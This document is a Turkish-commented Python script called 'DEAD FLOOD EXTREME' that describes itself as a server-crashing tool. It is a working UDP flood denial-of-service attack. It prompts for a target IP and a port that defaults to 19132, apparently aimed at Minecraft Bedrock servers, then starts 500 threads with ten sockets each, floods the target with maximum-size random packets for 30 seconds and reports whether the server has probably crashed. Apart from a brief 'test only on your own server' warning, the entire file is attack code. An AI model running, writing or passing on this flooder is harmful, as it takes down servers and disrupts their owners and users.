#!/usr/bin/env python3
"""
DEAD FLOOD 💀 EXTREME - Sunucu Çökertme Aracı
5 saniyede sunucuyu çökertecek kadar güçlü
"""

import socket
import random
import threading
import time
import sys
import os

class ExtremeFlood:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 19132
        self.threads = []
        self.packets_sent = 0
        self.bytes_sent = 0
        self.is_attacking = True
        
    def get_input(self):
        print("=== DEAD FLOOD 💀 EXTREME ===")
        print("5 SANİYEDE SUNUCU ÇÖKERTME\n")
        self.target_ip = input("Hedef IP: ").strip() or "127.0.0.1"
        port_input = input("Port [19132]: ").strip()
        self.target_port = int(port_input) if port_input else 19132
        
    def create_extreme_packet(self):
        """MAXIMUM boyutta paket - 65,507 byte (UDP max)"""
        # UDP maksimum paket boyutu
        max_size = 65507
        return random.randbytes(max_size)
    
    def create_massive_packets(self):
        """Çeşitli büyük paketler"""
        sizes = [65507, 60000, 50000, 40000, 30000]  # Devasa boyutlar
        size = random.choice(sizes)
        return random.randbytes(size)
    
    def flood_worker_extreme(self, worker_id):
        """Aşırı agresif flood worker"""
        # Her worker kendi socket'i ile çalışıyor
        sockets = []
        
        # Worker başına 10 socket açıyoruz
        for _ in range(10):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.001)  # Minimum timeout
                sockets.append(sock)
            except:
                pass
        
        print(f"[💀] Worker {worker_id} başlatıldı - {len(sockets)} socket")
        
        while self.is_attacking:
            for sock in sockets:
                try:
                    # Maksimum boyutta paket gönder
                    packet = self.create_extreme_packet()
                    sock.sendto(packet, (self.target_ip, self.target_port))
                    
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)
                    
                    # Aynı anda ikinci bir paket daha gönder
                    packet2 = self.create_massive_packets()
                    sock.sendto(packet2, (self.target_ip, self.target_port))
                    
                    self.packets_sent += 1
                    self.bytes_sent += len(packet2)
                    
                except:
                    # Hata durumunda socket'i yeniden oluştur
                    try:
                        sock.close()
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        new_sock.settimeout(0.001)
                        sockets[sockets.index(sock)] = new_sock
                    except:
                        pass
        
        # Temizlik
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def start_extreme_attack(self):
        """Aşırı saldırıyı başlat"""
        print(f"\n[💀] AŞIRI FLOOD BAŞLATILIYOR!")
        print(f"[🎯] Hedef: {self.target_ip}:{self.target_port}")
        print("[⚠️ ] UYARI: Sunucu 5-10 saniye içinde çökebilir!\n")
        
        # Thread sayısı - sistemin elverdiği kadar
        thread_count = 500  # Aşırı yüksek thread sayısı
        
        input("Başlatmak için ENTER'a bas...")
        
        print(f"[⚡] {thread_count} EXTREME thread oluşturuluyor...")
        
        start_time = time.time()
        self.is_attacking = True
        self.packets_sent = 0
        self.bytes_sent = 0
        
        # Thread'leri başlat
        for i in range(thread_count):
            try:
                thread = threading.Thread(target=self.flood_worker_extreme, args=(i+1,))
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
            except:
                pass
        
        print(f"[💀] {len(self.threads)} thread başlatıldı!")
        print("[💀] SUNUCUYA AŞIRI YÜK BİNİYOR...\n")
        
        try:
            # Sadece 30 saniye çalışsın
            while self.is_attacking and (time.time() - start_time) < 30:
                elapsed = time.time() - start_time
                
                # Gerçek zamanlı istatistikler
                packets_per_sec = self.packets_sent / elapsed if elapsed > 0 else 0
                bytes_per_sec = self.bytes_sent / elapsed if elapsed > 0 else 0
                mbps = (bytes_per_sec * 8) / 1_000_000
                
                print(f"[🔥] {elapsed:.1f}s | "
                      f"Paket: {self.packets_sent:,} | "
                      f"Veri: {self.bytes_sent/1_000_000:.1f}MB | "
                      f"Hız: {mbps:.1f} Mbps")
                
                # İlk 10 saniye kritik
                if elapsed < 10:
                    print(f"[💥] KRİTİK YÜKLEME... {10 - int(elapsed)}s")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n[💀] Durduruluyor...")
        
        finally:
            self.is_attacking = False
            total_time = time.time() - start_time
            
            print(f"\n[💀] SALDIRI TAMAMLANDI!")
            print(f"[📊] FİNAL İSTATİSTİKLER:")
            print(f"    Toplam Süre: {total_time:.1f}s")
            print(f"    Toplam Paket: {self.packets_sent:,}")
            print(f"    Toplam Veri: {self.bytes_sent/1_000_000:.1f} MB")
            print(f"    Ortalama Hız: {mbps:.1f} Mbps")
            
            if mbps > 100:
                print(f"[🎯] HEDEF: SUNUCU BÜYÜK OLASILIKLA ÇÖKTÜ! 💀")
            elif mbps > 50:
                print(f"[🎯] HEDEF: SUNUCU AĞIR HASAR ALDI! 🔥")
            else:
                print(f"[🎯] HEDEF: SUNUCU ETKİLENDİ! ⚡")

def main():
    # Python'un thread sınırını kaldır
    import threading
    threading.stack_size(128*1024)  # 128KB stack size
    
    print("=== DEAD FLOOD 💀 EXTREME ===")
    print("SUNUCU ÇÖKERTME ARACI")
    print("⚠️  SADECE KENDİ SUNUCUNDA TEST ET! ⚠️\n")
    
    flood = ExtremeFlood()
    flood.get_input()
    flood.start_extreme_attack()

if __name__ == "__main__":
    main()